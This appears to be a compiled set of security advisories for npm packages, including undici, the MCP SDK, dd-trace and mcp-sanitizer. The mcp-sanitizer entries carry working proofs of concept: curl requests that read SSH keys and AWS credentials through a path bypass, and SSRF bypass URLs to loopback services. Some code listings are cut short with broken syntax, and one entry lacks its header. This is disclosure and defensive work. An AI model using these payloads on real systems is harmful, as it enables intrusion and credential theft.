### GHSA-f897-62hf-6gxq — MCP TypeScript SDK: HTTP server transports and handlers did not limit request body size or JSON-RPC batch length
- Aliases:  | Published: 2026-10-27 | Modified: 2026-10-27 | Severity: HIGH
- CWE: CWE-770
- CVSS_V3: `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H`
- Affected npm/@modelcontextprotocol/sdk: introduced:1.10.0 fixed:1.30.1
- Affected npm/@modelcontextprotocol/server: introduced:2.0.0 fixed:2.1.0
- Affected npm/@modelcontextprotocol/node: introduced:2.0.0 fixed:2.1.0
- Affected npm/@modelcontextprotocol/hono: introduced:2.0.0 fixed:2.0.1

### Summary
In affected versions, MCP servers reachable over HTTP put no limit on the size of a POST body or on the number of messages in a JSON-RPC batch. Large requests could exhaust the server's memory, and one long batch could block it from serving anyone else. No credentials were needed, unless your application authenticates requests before they reach the SDK.

### Am I affected?
Yes, if clients you do not fully trust can reach your server over Streamable HTTP. A body parser such as `express.json()` does not protect you, because it does not limit batch length. Servers that only use stdio are not affected.

Affected versions:

- `@modelcontextprotocol/sdk` 1.10.0 through 1.30.0
- `@modelcontextprotocol/server` 2.0.0
- `@modelcontextprotocol/node` 2.0.0
- `@modelcontextprotocol/hono` 2.0.0

### Fix
Upgrade to:

- 1.x: `@modelcontextprotocol/sdk` 1.30.1 or later
- 2.x: `@modelcontextprotocol/server` 2.1.0, `@modelcontextprotocol/node` 2.1.0 and `@modelcontextprotocol/hono` 2.0.1 or later. Upgrade every one you have installed.

Bodies over 4 MiB now get `413`, and batches over 100 messages get `400`. If your clients send larger bodies, raise the new `maxRequestBodySize` option.

If you cannot upgrade yet, cap request body size in a reverse proxy.

### GHSA-qrxm-fqhp-jwvm — undici vulnerable to Denial of Service via TLS 1.2 certificate-changing renegotiation
- Aliases: CVE-2026-87018 | Published: 2026-10-27 | Modified: 2026-10-27 | Severity: HIGH
- CWE: CWE-248, CWE-617
- CVSS_V3: `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H`
- Affected npm/undici: introduced:4.2.1 fixed:6.29.1
- Affected npm/undici: introduced:7.0.0 fixed:7.30.1
- Affected npm/undici: introduced:8.0.0 fixed:8.12.2

## Impact

undici crashes the client process when a TLS 1.2 server renegotiates after the connection is established and presents a different, CA-trusted certificate whose hostname does not match the requested host. Node.js re-runs hostname verification on the renegotiated handshake and destroys the socket with `ERR_TLS_CERT_ALTNAME_INVALID`. undici's established socket error handler asserted that this error code could never occur, so the peer-controlled error became an uncaught `AssertionError` that terminates the Node.js process. Both the HTTP/1.1 and HTTP/2 paths are affected.

A malicious or compromised HTTPS endpoint reached through undici or the global `fetch()` can crash the client with a single server-initiated renegotiation, taking down all in-flight requests and background work in the process. Only TLS 1.2 is affected, because TLS 1.3 does not support renegotiation. Exploitation does not require a CA compromise: the attacker controls the endpoint and can present two ordinary valid certificates, the first matching the requested URL and the second intentionally not matching it.

## Patches

Upgrade to undici 6.29.1, 7.30.1, or 8.12.2.

## Workarounds

Restrict outbound connections to TLS 1.3, for example by setting `connect: { minVersion: 'TLSv1.3', maxVersion: 'TLSv1.3' }` on the client or agent, so that renegotiation cannot occur, when the target endpoints support TLS 1.3.

### GHSA-2m5v-pch6-74hx — undici vulnerable to TLS certificate validation bypass via dropped tls options in Agent
- Aliases: CVE-2026-109383 | Published: 2026-10-27 | Modified: 2026-10-27 | Severity: HIGH
- CWE: CWE-295
- CVSS_V3: `CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:N`
- Affected npm/undici: introduced:4.0.0 fixed:6.29.1
- Affected npm/undici: introduced:7.0.0 fixed:7.30.1
- Affected npm/undici: introduced:8.0.0 fixed:8.12.2

### Impact

undici's `Agent` passes its constructor options through a JSON-based deep clone (`JSON.parse(JSON.stringify(...))`) before forwarding them to each per-origin `Pool`. JSON cannot represent functions, so a caller-supplied `tls` option containing a `checkServerIdentity` callback is silently dropped before it reaches the TLS layer. As a result, a TLS peer whose certificate a custom `checkServerIdentity` was written to reject, but which passes Node's default hostname and chain checks, is silently accepted when the request is made through `Agent`. Because `Agent` is the default dispatcher behind `request`, `fetch`, and `setGlobalDispatcher`, this is the path most applications use. `EnvHttpProxyAgent` is also affected on its direct and `NO_PROXY` routes, which delegate to an internal `Agent`.

Only applications that pass a function-valued `tls` option (such as a custom `checkServerIdentity` for certificate or public-key pinning) are affected. Passing the same options through `connect` is not affected. This is the `Agent` counterpart of the `BalancedPool` certificate validation bypass fixed in CVE-2026-84961.

### Patches

Upgrade to undici `6.29.1`, `7.30.1`, or `8.12.2`. `Agent` now preserves the `tls` option outside the JSON clone, so custom TLS verification callbacks are forwarded to each origin unchanged.

### Workarounds

Pass the TLS options through `connect` instead of `tls`. For proxied `EnvHttpProxyAgent` destinations, use `requestTls` / `proxyTls`.

### GHSA-4w7w-5xrc-9h26 — undici vulnerable to cache poisoning and cross-user disclosure via cross-origin redirects
- Aliases: CVE-2026-109829 | Published: 2026-10-27 | Modified: 2026-10-27 | Severity: HIGH
- CWE: CWE-346, CWE-524
- CVSS_V3: `CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:N`
- Affected npm/undici: introduced:7.0.0 fixed:7.30.1
- Affected npm/undici: introduced:8.0.0 fixed:8.12.2

### Impact

When an originless `Agent` composes the redirect and cache interceptors as `compose(redirect(), cache())` with a shared cache (`type: 'shared'`), the cache builds its key from the original request URL before the redirect handler changes the origin. The response produced after a redirect is then stored under the original key, even when the redirect crossed to a different origin.

An attacker who controls the target of a redirect from a trusted URL can have their response cached under that trusted URL. A later caller requesting the trusted URL receives the attacker's body from the shared cache without either origin being contacted, allowing persistent cache poisoning. The same key confusion also discloses private data: when an authenticated request returns a `private, no-store` redirect to a user-specific resource, the final response is stored under the original URL and can be served to a later unauthenticated caller.

The cache interceptor was introduced in undici 7.0.0, and all 7.x and 8.x releases before the patched versions are affected. Applications are affected only when an originless `Agent`, a shared `MemoryCacheStore` or `SqliteCacheStore`, and the composition `compose(redirect(), cache())` are all used. Origin-bound `Client` and `Pool` dispatchers, and the reverse composition `compose(cache(), redirect())`, are not affected.

### Patches

Upgrade to `7.30.1` or `8.12.2`. Before storing a response, undici now verifies that the origin that produced it still matches the cache key, and preserves each redirect hop's cache-control policy, so cross-origin redirect responses and responses behind a `no-store` or `private` hop are no longer cached under the original key.

### Workarounds

Compose the interceptors as `compose(cache(), redirect())`, use per-origin dispatchers and cache stores, or disable shared caching on redirect-capable requests.

### Impact
A Cross-Site Scripting (XSS) vulnerability has been discovered in the CKEditor 5 engine. This vulnerability is caused by a prototype pollution issue in the `es-toolkit` library used in the CKEditor 5 codebase. This vulnerability could lead to unauthorized JavaScript code execution when the editor processes incoming `style` attribute values.

The underlying issue has been patched by the library maintainers, and the fix has been incorporated into CKEditor 5.

### Patches
The problem has been recognized and patched. The fix will be available in version `48.5.1` (and above) and `47.7.4` (LTS).

### GHSA-x94g-w73q-hpcw — dd-trace: ReDOS in URL query string obfuscation
- Aliases: CVE-2026-116693 | Published: 2026-10-27 | Modified: 2026-10-27 | Severity: HIGH
- CWE: CWE-1333
- CVSS_V4: `CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI:N/VA:H/SC:N/SI:N/SA:N`
- Affected npm/dd-trace: introduced:2.0.0 fixed:5.131.1
- Affected npm/dd-trace: introduced:6.0.0 fixed:6.20.1

### Summary

A regular expression used to obfuscate URL query strings can consume excessive CPU when processing certain attacker-controlled input. This can stall request processing and cause denial of service in applications using affected HTTP tracing integrations.

### Details

The default query-string obfuscation pattern can exhibit excessive backtracking. The pattern is applied synchronously when recording HTTP URL metadata, allowing query-string processing to occupy application resources for an extended period.

As a workaround, set DD_TRACE_OBFUSCATION_QUERY_STRING_REGEXP to the fixed regex below, then restart the application.

```
DD_TRACE_OBFUSCATION_QUERY_STRING_REGEXP='(?:(?:"|%22)?)(?:(?:old[-_]?|new[-_]?)?p(?:ass)?w(?:or)?d(?:1|2)?|pass(?:[-_]?phrase)?|secret|(?:api[-_]?|private[-_]?|public[-_]?|access[-_]?|secret[-_]?|app(?:lication)?[-_]?)key(?:[-_]?id)?|token|consumer[-_]?(?:id|key|secret)|sign(?:ed|ature)?|auth(?:entication|orization)?)(?:(?:\s|%20)*(?:=|%3D)[^&]+|(?:"|%22)(?:\s|%20)*(?::|%3A)(?:\s|%20)*(?:"|%22)(?:%2[^2]|%[^2]|[^"%])+(?:"|%22))|(?:bearer(?:\s|%20)+[a-z0-9._\-]+|token(?::|%3A)[a-z0-9]{13}|gh[opsu]_[0-9a-zA-Z]{36}|(?:(?<![\w-])|(?<=%[0-9a-f]{2}))ey[I-L][\w-]+(?:=|%3D)*\.ey[I-L][\w-]+(?:=|%3D)*(?:\.(?:[\w.+/=-]|%3D|%2F|%2B)+)?|-{5}BEGIN(?:[a-z\s]|%20)+PRIVATE(?:\s|%20)KEY-{5}[^\-]+-{5}END(?:[a-z\s]|%20)+PRIVATE(?:\s|%20)KEY(?:-{5})?(?:\n|%0A)?|(?:ssh-(?:rsa|dss)|ecdsa-[a-z0-9]+-[a-z0-9]+)(?:\s|%20|%09)+(?:[a-z0-9/.+]|%2F|%5C|%2B){100,}(?:=|%3D)*(?:(?:\s|%20|%09)+[a-z0-9._-]+)?)'
```

### Proof of concept

Detailed triggering inputs and reproduction steps are omitted from this advisory. The patched version includes regression coverage for the affected behavior.

### Impact

Regular expression denial of service (ReDoS) affecting applications that process attacker-controlled URL query strings through the vulnerable obfuscation pattern. Successful exploitation can cause excessive CPU consumption, prolonged request latency, and service unavailability.

The vulnerable processing is enabled by default for affected HTTP integrations that include query strings in URL span tags.

### GHSA-7w82-6f9j-v9jp — mcp-sanitizer: File Path Sanitizer Permits Arbitrary User-Home Absolute Paths
- Aliases:  | Published: 2026-10-28 | Modified: 2026-10-28 | Severity: HIGH
- CWE: CWE-22
- CVSS_V3: `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N`
- Affected npm/mcp-sanitizer: introduced:0 fixed:1.4.0

## File Path Sanitizer Permits Arbitrary User-Home Absolute Paths

### Summary

`mcp-sanitizer` v1.3.3 explicitly whitelists `/home/` and `/Users/` as allowed absolute path prefixes in its file path validation logic (`src/utils/validation-utils.js:188-196`). As a result, paths such as `/home/alice/.ssh/id_rsa` and `/home/alice/.aws/credentials` pass through `sanitizer.sanitize()` with `blocked=false`, even though they point to highly sensitive files outside any configured safe root. Any consumer application that trusts the sanitized path and passes it to a filesystem read/write operation (e.g., `fs.readFile`) will expose arbitrary user-home directory files to an unauthenticated network attacker. Dynamic reproduction confirmed exfiltration of a simulated SSH private key and AWS credentials via a single HTTP POST request.

### Details

The vulnerability resides in the `validateFilePath` function inside `src/utils/validation-utils.js`. When an absolute path falls outside the configured safe root directories, the function performs a secondary check against a hardcoded allowlist:

```js
// src/utils/validation-utils.js:188-196
if (!isInSafeLocation && path.isAbsolute(normalizedPath)) {
  const allowedAbsolutePaths = ['/tmp/', '/var/tmp/', '/home/', '/Users/'];
  const isAllowedAbsolute = allowedAbsolutePaths.some(allowed =>
    normalizedPath.toLowerCase().startsWith(allowed.toLowerCase())
  );

  if (!isAllowedAbsolute) {
    throw new Error('Absolute path not in allowed safe directory');
  }
}
```

Because `/home/` and `/Users/` are included in `allowedAbsolutePaths`, any path beneath those directories — including `~/.ssh/id_rsa`, `~/.aws/credentials`, `~/.kube/config`, `~/.gnupg/`, etc. — is considered safe and passes validation unchanged.

The dangerous paths (`dangerousUnixPaths` at `src/utils/validation-utils.js:135`) only cover `/etc/`, `/proc/`, `/sys/`, `/dev/`, `/root/`, `/boot/`, `/usr/bin/`, and `/sbin/`. Home-directory sensitive subdirectories (`.ssh`, `.aws`, `.gnupg`, `.kube`, `.config`) are never checked.

The full data flow from a network request to the vulnerable return value is:

1. **`src/middleware/express.js:538-541`** — The Express middleware routes `file_reader`/`file_writer` tool parameters to `sanitizer.sanitize(params.file_path, { type: 'file_path' })`.
2. **`src/sanitizer/mcp-sanitizer.js:523-524`** — When `context.type === 'file_path'`, `_secureSanitizeFilePath()` is called.
3. **`src/sanitizer/mcp-sanitizer.js:683-687`** — `validateFilePath()` is invoked; if it does not throw, the normalized path is returned as the sanitized value.
4. **`src/utils/validation-utils.js:188-196`** — The `/home/` prefix check passes without error.
5. **`src/utils/validation-utils.js:200-201`** — The original, attacker-controlled absolute path is returned to the caller as a trusted, sanitized value.

A consumer application receiving `{ blocked: false, sanitized: '/home/victim/.ssh/id_rsa' }` is expected to use that path for I/O. The sanitizer's own `README` and middleware integration imply that a `blocked: false` result is safe to act upon.

**Suggested patch:**

```diff
--- a/src/utils/validation-utils.js
+++ b/src/utils/validation-utils.js
@@
   const dangerousUnixPaths = ['/etc/', '/proc/', '/sys/', '/dev/', '/root/', '/boot/', '/usr/bin/', '/sbin/'];
+  const sensitiveHomeFragments = [
+    '/.ssh/', '/.aws/', '/.gnupg/', '/.kube/', '/.config/',
+    '/.npmrc', '/.env'
+  ];
@@
+  const normalizedForSensitiveCheck = normalizedPath.replace(/\\/g, '/').toLowerCase();
+  if (sensitiveHomeFragments.some(fragment => normalizedForSensitiveCheck.includes(fragment))) {
+    throw new Error('Access to sensitive user configuration path not allowed');
+  }
@@
-    const allowedAbsolutePaths = ['/tmp/', '/var/tmp/', '/home/', '/Users/'];
+    const allowedAbsolutePaths = ['/tmp/', '/var/tmp/'];
```

### PoC

**Environment requirements:** Docker, Python 3, Node.js 20

**Step 1 — Build and start the reproduction container:**

```bash
# From the vuln-002/ directory
python3 poc.py
```

The script automatically:
1. Copies the `mcp-sanitizer` source into a Docker build context.
2. Creates simulated victim files at `/home/victim/.ssh/id_rsa` and `/home/victim/.aws/credentials` inside the container.
3. Builds a consumer HTTP server (`server.js`) that calls `sanitizer.sanitize()` and then `fs.readFile` on the returned path.
4. Sends the three test requests described below.

**Step 2 — Manual HTTP requests (after the container is running on port 13572):**

Control test — must be blocked:
```bash
curl -s -X POST http://127.0.0.1:13572/tool \
  -H 'Content-Type: application/json' \
  -d '{"tool_name":"file_reader","parameters":{"file_path":"/etc/passwd"}}'
# Expected: {"blocked": true}
```

Exploit test 1 — SSH private key exfiltration:
```bash
curl -s -X POST http://127.0.0.1:13572/tool \
  -H 'Content-Type: application/json' \
  -d '{"tool_name":"file_reader","parameters":{"file_path":"/home/victim/.ssh/id_rsa"}}'
# Expected: {"blocked": false, "EXPLOIT_SUCCESS": true, "file_content": "-----BEGIN RSA PRIVATE KEY-----..."}
```

Exploit test 2 — AWS credentials exfiltration:
```bash
curl -s -X POST http://127.0.0.1:13572/tool \
  -H 'Content-Type: application/json' \
  -d '{"tool_name":"file_reader","parameters":{"file_path":"/home/victim/.aws/credentials"}}'
# Expected: {"blocked": false, "EXPLOIT_SUCCESS": true, "file_content": "[default]\naws_access_key_id = ..."}
```

**Observed results (Phase 2 dynamic reproduction):**

```
[Test 1 — Control] POST /tool {file_path: '/etc/passwd'}
  => blocked=true  ✓  (dangerousUnixPaths correctly blocks /etc/)

[Test 2 — Exploit] POST /tool {file_path: '/home/victim/.ssh/id_rsa'}
  => blocked=false, EXPLOIT_SUCCESS=true
  sanitized_path: /home/victim/.ssh/id_rsa
  file_content:
    -----BEGIN RSA PRIVATE KEY-----
    MIIEowIBAAKCAQEA0Z3VS5JJcds3xHnygWep4PAtEsHABkxFQnPmcEDLXdK
    SECRET_KEY_CONTENT_EXFILTRATED_VIA_HOME_PATH_BYPASS_VULN002
    -----END RSA PRIVATE KEY-----

[Test 3 — Exploit] POST /tool {file_path: '/home/victim/.aws/credentials'}
  => blocked=false, EXPLOIT_SUCCESS=true
  file_content:
    [default]
    aws_access_key_id = AKIAIOSFODNN7EXAMPLE
    aws_secret_access_key = wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY
    region = us-east-1
```

**Root cause confirmed:** `validation-utils.js:190` — `allowedAbsolutePaths` includes `'/home/'` and `'/Users/'`; any absolute path starting with `/home/` passes with `blocked=false`.

### Impact

This is a **Path Traversal / Improper Path Restriction (CWE-22)** vulnerability.

Any application that integrates `mcp-sanitizer` to validate file paths for MCP `file_reader` or `file_writer` tools is affected. The library is explicitly designed for use in MCP servers exposed over a network via the Express middleware. An unauthenticated remote attacker can supply an absolute path to any file under `/home/` or `/Users/` — requiring no authentication, no special privileges, and no interaction from a legitimate user.

**Sensitive targets include but are not limited to:**
- SSH private keys (`~/.ssh/id_rsa`, `~/.ssh/id_ed25519`)
- Cloud provider credentials (`~/.aws/credentials`, `~/.config/gcloud/credentials.db`)
- Kubernetes config (`~/.kube/config`)
- GPG keys (`~/.gnupg/`)
- Application tokens (`~/.npmrc`, `~/.netrc`, `~/.env`)

The confidentiality impact is **High** because SSH keys and cloud credentials grant full access to remote systems and cloud infrastructure. There is no integrity or availability impact, as the vulnerability is limited to reading (and potentially writing) files.

### Reproduction artifacts

#### `Dockerfile`

```dockerfile
# VULN-002 Reproduction: mcp-sanitizer v1.3.3 /home/* path bypass
# Builds a Node 20 container with:
#   - mcp-sanitizer source from the local repo
#   - Fake sensitive files in /home/victim/.ssh/ and /home/victim/.aws/
#   - A consumer HTTP server that trusts the sanitizer

FROM node:20-slim

LABEL vuln="VULN-002" \
      cwe="CWE-22" \
      title="mcp-sanitizer home-directory path bypass"

# Install mcp-sanitizer production dependencies
WORKDIR /app/repo
COPY repo/package.json repo/package-lock.json ./
RUN npm ci --omit=dev --no-audit --no-fund

# Copy mcp-sanitizer source code
COPY repo/src ./src

# Create simulated victim home directory with sensitive files
# These represent secrets a real attacker would target
RUN mkdir -p /home/victim/.ssh /home/victim/.aws
RUN echo '-----BEGIN RSA PRIVATE KEY-----'                                 > /home/victim/.ssh/id_rsa && \
    echo 'MIIEowIBAAKCAQEA0Z3VS5JJcds3xHnygWep4PAtEsHABkxFQnPmcEDLXdK'  >> /home/victim/.ssh/id_rsa && \
    echo 'SECRET_KEY_CONTENT_EXFILTRATED_VIA_HOME_PATH_BYPASS_VULN002'    >> /home/victim/.ssh/id_rsa && \
    echo 'CVE_VULN002_SANITIZER_ALLOWS_HOME_DIRECTORY_ABSOLUTE_PATHS'     >> /home/victim/.ssh/id_rsa && \
    echo '-----END RSA PRIVATE KEY-----'                                   >> /home/victim/.ssh/id_rsa && \
    chmod 600 /home/victim/.ssh/id_rsa
RUN echo '[default]'                                                        > /home/victim/.aws/credentials && \
    echo 'aws_access_key_id = AKIAIOSFODNN7EXAMPLE'                       >> /home/victim/.aws/credentials && \
    echo 'aws_secret_access_key = wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY' >> /home/victim/.aws/credentials && \
    echo 'region = us-east-1'                                              >> /home/victim/.aws/credentials && \
    chmod 600 /home/victim/.aws/credentials

# Copy the consumer server application
WORKDIR /app
COPY server.js ./server.js

EXPOSE 3000

CMD ["node", "server.js"]
```

#### `poc.py`

```python
#!/usr/bin/env python3
"""
VULN-002 Dynamic Reproduction PoC
mcp-sanitizer v1.3.3 — File path sanitizer permits arbitrary user-home absolute paths (CWE-22)

Vulnerability:
    src/utils/validation-utils.js:188-196 explicitly whitelists '/home/' and '/Users/'
    as allowed absolute path prefixes. A path like /home/victim/.ssh/id_rsa passes
    sanitizer.sanitize(path, {type: 'file_path'}) with blocked=false, and the consumer
    app reads the file using the trusted sanitized path.

Attack chain:
    1. Attacker sends POST /tool with file_path=/home/victim/.ssh/id_rsa
    2. sanitizer.sanitize() returns {blocked: false, sanitized: '/home/victim/.ssh/id_rsa'}
    3. Consumer app calls fs.readFile(sanitized_path) — trusting the sanitizer
    4. SSH private key contents returned in HTTP response (exfiltrated)

Usage:
    python3 poc.py
"""

import json
import os
import shutil
import subprocess
import sys
import tempfile
import time
import urllib.request
import urllib.error

# Paths
SCRIPT_DIR = os.path.dirname(os.path.abspath(__file__))
REPO_DIR = os.path.abspath(os.path.join(SCRIPT_DIR, "..", "repo"))
PHASE2_RESULT = os.path.join(SCRIPT_DIR, "phase2_result.json")

# Docker settings
IMAGE_NAME = "vuln002-mcp-sanitizer-poc"
CONTAINER_NAME = "vuln002-poc-container"
HOST_PORT = 13572  # High port to avoid conflicts

BASE_URL = f"http://127.0.0.1:{HOST_PORT}"
TOOL_URL = f"{BASE_URL}/tool"
HEALTH_URL = f"{BASE_URL}/health"


def log(msg):
    print(f"[poc] {msg}", flush=True)


def save_result(passed, verdict, reason, evidence, build_cmd, run_cmd):
    result = {
        "passed": passed,
        "verdict": verdict,
        "reason": reason,
        "build_command": build_cmd,
        "run_command": run_cmd,
        "poc_command": "python3 poc.py",
        "evidence": evidence,
        "artifacts": ["Dockerfile", "poc.py", "server.js"]
    }
    with open(PHASE2_RESULT, "w", encoding="utf-8") as f:
        json.dump(result, f, indent=2, ensure_ascii=False)
    log(f"Saved phase2_result.json (verdict={verdict})")


def run(cmd, timeout=300, capture=True):
    """Run a subprocess command and return (returncode, stdout, stderr)."""
    result = subprocess.run(
        cmd, capture_output=capture, text=True, timeout=timeout
    )
    return result.returncode, result.stdout, result.stderr


def stop_container():
    subprocess.run(
        ["docker", "rm", "-f", CONTAINER_NAME],
        capture_output=True, timeout=15
    )


def http_post(url, payload, timeout=8):
    data = json.dumps(payload).encode("utf-8")
    req = urllib.request.Request(
        url, data=data,
        headers={"Content-Type": "application/json"},
        method="POST"
    )
    with urllib.request.urlopen(req, timeout=timeout) as resp:
        return json.loads(resp.read().decode("utf-8"))


def http_get(url, timeout=5):
    with urllib.request.urlopen(url, timeout=timeout) as resp:
        return json.loads(resp.read().decode("utf-8"))


def wait_for_server(max_wait=40):
    log(f"Polling {HEALTH_URL} until ready (max {max_wait}s)...")
    deadline = time.monotonic() + max_wait
    while time.monotonic() < deadline:
        try:
            resp = http_get(HEALTH_URL)
            if resp.get("ok"):
                log("Server is up and responding.")
                return True
        except Exception:
            pass
        time.sleep(0.6)
    return False


def prepare_build_context():
    """
    Create a temporary Docker build context containing:
      build_ctx/
        Dockerfile
        server.js
        repo/
          package.json
          package-lock.json
          src/
    """
    build_ctx = tempfile.mkdtemp(prefix="vuln002-ctx-")
    log(f"Build context directory: {build_ctx}")

    # Copy Dockerfile and server.js from this script's directory
    for fname in ("Dockerfile", "server.js"):
        src = os.path.join(SCRIPT_DIR, fname)
        dst = os.path.join(build_ctx, fname)
        shutil.copy2(src, dst)
        log(f"  Copied {fname}")

    # Copy only the necessary repo files (skip node_modules to keep context small)
    repo_dst = os.path.join(build_ctx, "repo")
    os.makedirs(repo_dst)
    shutil.copy2(os.path.join(REPO_DIR, "package.json"), repo_dst)
    shutil.copy2(os.path.join(REPO_DIR, "package-lock.json"), repo_dst)
    shutil.copytree(
        os.path.join(REPO_DIR, "src"),
        os.path.join(repo_dst, "src")
    )
    log(f"  Copied repo/src and package files")

    return build_ctx


def main():
    log("=" * 60)
    log("VULN-002 Dynamic Reproduction — mcp-sanitizer /home/* bypass")
    log("=" * 60)

    # Validate prerequisites
    if not os.path.isdir(REPO_DIR):
        log(f"ERROR: Repo not found at {REPO_DIR}")
        save_result(False, "FAIL",
                    f"재현 전제조건 미충족: repo 디렉터리({REPO_DIR})가 존재하지 않음.",
                    "", "", "")
        return 1

    rc, _, _ = run(["docker", "info"], timeout=10)
    if rc != 0:

                    "Docker 데몬에 접근할 수 없음. Docker가 실행 중인지 확인하시오.",
                    "", "", "")
        return 1

    # Clean up any leftover container from a previous run
    stop_container()

    build_ctx = None
    try:
        # Step 1: Prepare build context
        build_ctx = prepare_build_context()

        # Step 2: Build Docker image
        build_cmd = f"docker build -t {IMAGE_NAME} {build_ctx}"
        log(f"Building Docker image: {build_cmd}")
        rc, stdout, stderr = run(
            ["docker", "build", "-t", IMAGE_NAME, build_ctx],
            timeout=300
        )
        if rc != 0:
            err_tail = (stdout + stderr)[-600:]
            log(f"Docker build FAILED (rc={rc}):\n{err_tail}")
            save_result(False, "FAIL",
                        f"Docker 이미지 빌드 실패 (exit code {rc}). "
                        f"'npm ci --omit=dev' 실패 또는 Dockerfile 오류 가능성. "
                        f"마지막 출력: {err_tail[-200:]}",
                        err_tail,
                        build_cmd,

                        stderr[-300:],

        container_id = stdout.strip()
        log(f"Container started: {container_id[:12]}")

        # Step 4: Wait for HTTP server inside container
        if not wait_for_server():
```

### GHSA-4mfg-r38w-w8fg — mcp-sanitizer: URL sanitizer allows localhost/IPv6 loopback SSRF bypass via explicit port or bracketed IPv6
- Aliases:  | Published: 2026-10-28 | Modified: 2026-10-28 | Severity: HIGH
- CWE: CWE-918
- CVSS_V3: `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:L/A:N`
- Affected npm/mcp-sanitizer: introduced:0 fixed:1.4.0

## URL sanitizer allows localhost/IPv6 loopback SSRF bypass via explicit port or bracketed IPv6

### Summary

`mcp-sanitizer` v1.3.3 fails to block Server-Side Request Forgery (SSRF) targets when a `localhost` URL includes an explicit port (e.g., `http://localhost:8080/`) or when an IPv6 loopback/link-local address is expressed in bracketed notation (e.g., `http://[::1]:8080/`, `http://[fe80::1]:8080/`). Because the library is explicitly designed to gate MCP tool parameters such as `web_fetch` and `web_scraper` before outbound HTTP requests are made, a bypass here directly enables an attacker-controlled URL to reach internal services, leaking their responses.

### Details

The vulnerability exists in `src/utils/validation-utils.js` inside the `validateURLLocation()` function that is called by `_secureSanitizeURL()` in `src/sanitizer/mcp-sanitizer.js:698`.

**Bug 1 — Port-guarded localhost check (line 274–276):**

```js
// src/utils/validation-utils.js:274-276
if ((hostname === 'localhost' || hostname === '127.0.0.1' || hostname === '::1') && !parsedUrl.port) {
  throw new Error('URL points to localhost without explicit port');
}
```

The `&& !parsedUrl.port` guard means that any localhost URL that includes a port number is *not* thrown. `http://localhost:8080/` passes the check entirely, returning `blocked: false` with the original URL preserved.

**Bug 2 — Bracketed IPv6 hostname mismatch (lines 272, 293–295):**

```js
// src/utils/validation-utils.js:293-295
if (hostname.startsWith('169.254.') || hostname.startsWith('fe80:')) {
  throw new Error(`URL points to link-local address: ${hostname}`);
}
```

The Node.js `URL` API returns `parsedUrl.hostname` for IPv6 addresses *with* surrounding brackets: `[::1]`, `[fe80::1]`. The string comparison `hostname === '::1'` (line 274) and `hostname.startsWith('fe80:')` (line 293) therefore never match, because the actual string starts with `[`.

**Data flow through the middleware:**

1. `src/middleware/express.js:499` — tool name derived from `req.params.toolName || req.body?.tool_name`.
2. `src/middleware/express.js:548-554` — `web_scraper`/`web_fetch` `params.url` forwarded to `sanitizer.sanitize(url, { type: 'url' })`.
3. `src/sanitizer/mcp-sanitizer.js:527-528` — context type `url` routes to `_secureSanitizeURL()`.
4. `src/sanitizer/mcp-sanitizer.js:698-700` — `validateURLLocation(parsedUrl)` called; on success, `parsedUrl.toString()` returned to caller as the sanitized, trusted URL.

Both bugs are in the default code path; no special configuration is required to trigger them.

**Suggested patch:**

```diff
--- a/src/utils/validation-utils.js
+++ b/src/utils/validation-utils.js
@@ const { URL } = require('url');
+const net = require('net');
@@ 
-  const hostname = parsedUrl.hostname.toLowerCase();
+  const hostname = parsedUrl.hostname.toLowerCase().replace(/^\[|\]$/g, '').replace(/\.$/, '');
@@ 
-  if ((hostname === 'localhost' || hostname === '127.0.0.1' || hostname === '::1') && !parsedUrl.port) {
-    throw new Error('URL points to localhost without explicit port');
+  if (hostname === 'localhost' || hostname.endsWith('.localhost') || hostname === '::1') {
+    throw new Error('URL points to localhost or loopback');
   }
@@ 
-  if (hostname.startsWith('169.254.') || hostname.startsWith('fe80:')) {
+  if (hostname.startsWith('169.254.') || hostname.startsWith('fe80:') ||
+      hostname.startsWith('fc') || hostname.startsWith('fd')) {
     throw new Error(`URL points to link-local address: ${hostname}`);
   }
+
+  if (net.isIP(hostname) === 6 && (hostname === '::1' || hostname.startsWith('fe80:'))) {
+    throw new Error(`URL points to restricted IPv6 address: ${hostname}`);
+  }
```

### PoC

**Prerequisites:** Docker installed; no other dependencies required.

**1. Build the Docker image:**

```bash
docker build \
  -f vuln-001/Dockerfile \
  -t vuln-001-mcp-sanitizer \
  reports/npmAI_754_starman69__mcp-sanitizer
```

**2. Run the PoC:**

```bash
docker run --rm vuln-001-mcp-sanitizer
```

The `poc.py` script inside the image:
- Starts a mock internal HTTP service on `127.0.0.1:8080` serving the string `INTERNAL_SECRET_DATA_9f3a2b1c`.
- Calls `sanitizer.sanitize(url, { type: 'url' })` via Node.js for five URLs (two expected-blocked, three bypass candidates).
- Performs an actual `GET http://localhost:8080/` using the sanitizer-approved URL and confirms the secret is returned.

**Expected output (abbreviated):**

```
[BYPASS_CONFIRMED] http://localhost:8080/  blocked=False  sanitized=http://localhost:8080/
[BYPASS_CONFIRMED] http://[::1]:8080/     blocked=False  sanitized=http://[::1]:8080/
[BYPASS_CONFIRMED] http://[fe80::1]:8080/ blocked=False  sanitized=http://[fe80::1]:8080/
[SSRF HTTP 200] GET http://localhost:8080/ => 'INTERNAL_SECRET_DATA_9f3a2b1c\npath=/'
[!!!] INTERNAL SECRET EXFILTRATED: INTERNAL_SECRET_DATA_9f3a2b1c
RESULT: PASS - SSRF bypass fully demonstrated end-to-end
```

Baseline controls confirm the library *does* block `http://localhost/` and `http://127.0.0.1/` (`blocked: true`), proving the bypasses are not a general failure but a precise gap in the validation logic.

**Minimal inline repro (no Docker):**

```bash
# Inside the mcp-sanitizer repository root (npm ci first)
node - <<'NODE'
const MCPSanitizer = require('./src/sanitizer/mcp-sanitizer');
const sanitizer = new MCPSanitizer();
for (const url of [
  'http://localhost:8080/',
  'http://[::1]:8080/',
  'http://[fe80::1]:8080/'
]) {
  const r = sanitizer.sanitize(url, { type: 'url' });
  console.log(url, '=> blocked=', r.blocked, 'sanitized=', r.sanitized);
